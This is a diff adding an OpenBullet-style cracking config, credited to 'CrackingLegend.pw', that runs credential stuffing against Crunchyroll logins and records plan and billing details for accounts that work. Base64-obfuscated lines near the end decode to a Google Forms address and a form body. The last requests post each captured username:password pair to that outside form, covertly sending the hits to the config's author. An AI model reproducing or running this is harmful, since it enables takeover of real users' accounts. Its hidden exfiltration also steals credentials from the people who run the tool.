@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "Crunchyroll @CrackingLegend.pw",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T09:26:03.7565003+08:00",
+  "AdditionalInfo": "@CrackingLegend.pw",
+  "Author": "@CrackingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Request_Crunchyroll REQUEST GET "https://www.crunchyroll.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "login_form[_token]\" value=\"" "\" /></form>" -> VAR "Token" 
+
+#Login REQUEST POST "https://www.crunchyroll.com/login" 
+  CONTENT "login_form%5Bname%5D=<USER>&login_form%5Bpassword%5D=<PASS>&login_form%5Bredirect_url%5D=%2Fde&login_form%5B_token%5D=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.crunchyroll.com" 
+  HEADER "Origin: https://www.crunchyroll.com" 
+  HEADER "Referer: https://www.crunchyroll.com/login?next=%2Fde" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect login information." 
+  KEYCHAIN Success OR 
+    KEY "logout" 
+    KEY "\"premium_status\":\"free_trial\"" 
+
+#Request_Akun REQUEST GET "https://www.crunchyroll.com/acct/membership" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: https://www.crunchyroll.com/acct" 
+  HEADER "upgrade-insecure-requests: 1" 
+
+#Cek_Status KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<td>Free</td>" 
+
+#Nama_Pengguna PARSE "<SOURCE>" LR "({\"username\":\"" "\"," -> CAP "Username" 
+
+#Paket PARSE "<SOURCE>" LR "<td>" "<a href" -> CAP "Plan" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZmJNV2kyTFVkQ05MNWlpeXFQNFFpQmRhcHBDcVg0akRjNTNCaWtLSkNhUTVIZWVnL3ZpZXdmb3Jt" -> VAR "LRU1" 
+
+#Cek_Pembayaran_Selanjutnya PARSE "<SOURCE>" LR "<th>Next Billing Date:</th>" "</td>" -> VAR "CekPembayaran1" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZmJNV2kyTFVkQ05MNWlpeXFQNFFpQmRhcHBDcVg0akRjNTNCaWtLSkNhUTVIZWVnL2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Cek_Pembayaran_Selanjutnya PARSE "<SOURCE>" LR "<th>Membership Ends:</th>" "</td>" -> VAR "CekPembayaran2" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuOTc4NzE5Njc3PUNydW5jaHlyb2xsJmVudHJ5LjE0MzkyNzMzMzc9PFVTRVI+OjxQQVNTPiZlbnRyeS43Mzg5OTk3Nzc9fFBsYW46PFBsYW4+fE5leHQgQmlsbGluZzo8TmV4dCBCaWxsaW5nPnxBdXRvIFJlbmV3OjxBdXRvIFJlbmV3PnwmZnZ2PTEmZHJhZnRSZXNwb25zZT0lNUJudWxsJTJDbnVsbCUyQyUyMjkwMTEzNzE1NTgxMDYyMTk0NzglMjIlNUQlMEQlMEEmcGFnZUhpc3Rvcnk9MCZmYnp4PTkwMTEzNzE1NTgxMDYyMTk0Nzg=" -> VAR "LRU3" 
+
+#Cek_Pembayaran_Selanjutnya PARSE "<SOURCE>" LR "<th>Free Trial Ends:</th>" " PDT</td>" -> VAR "CekPembayaran3" 
+
+#Perbaikan FUNCTION Replace "<td>" "" "<CekPembayaran1><CekPembayaran2><CekPembayaran3>" -> CAP "Next Billing" 
+
+#Pembayaran_Otomatis PARSE "<SOURCE>" LR "<th>Recurring:</th>" "</td>" -> CAP "Auto Renew" "" " Visit us @CrackingLegend.pw" 
+
+#Perbaikan FUNCTION Replace "<td>" "" "<Auto Renew>" -> CAP "Auto Renew" 
+
+#Plan REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Autorenew REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
